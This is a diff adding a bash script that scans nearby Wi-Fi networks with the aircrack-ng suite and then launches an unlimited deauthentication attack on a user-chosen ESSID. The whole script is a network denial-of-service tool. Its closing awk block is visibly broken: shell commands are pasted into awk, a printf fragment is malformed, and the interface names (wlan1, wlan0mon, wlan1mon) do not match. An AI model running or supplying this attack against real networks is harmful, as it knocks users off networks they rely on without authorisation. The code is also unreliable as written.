@@ -1,0 +1,33 @@
+#!/bin/bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan1
+rm -f scan-*
+echo "Press a number to start"
+echo "Deauth : 1"
+read OPTION
+
+
+
+
+
+if [ $OPTION -eq 1 ]; then
+echo "scanning..."
+timeout 15s airodump-ng wlan0mon --write scan >/dev/null 2>&1
+echo "ESSID's:"
+awk -F',' '
+NF > 13 && $14 != "" {gsub(/^ +| +$/, "", $14); print $14}' scan-01.csv | sort -u
+fi
+
+read -p "ESSID to deauth:" ESSID
+
+awk -F',' -v essid="$ESSID" '
+NF > 13 {
+    gsub(/^ +| +$/, "", $1)
+    gsub(/^ +| +$/, "", $4)
+    gsub(/^ +| +$/, "", $14)
+
+    if ($14 == essid) {
+    sudo iw dev wlan0mon set channel %s\n", $1, $4
+    sudo aireplay-ng wlan1mon --deauth 0 -a %s
+    }
+}' scan-01.csv
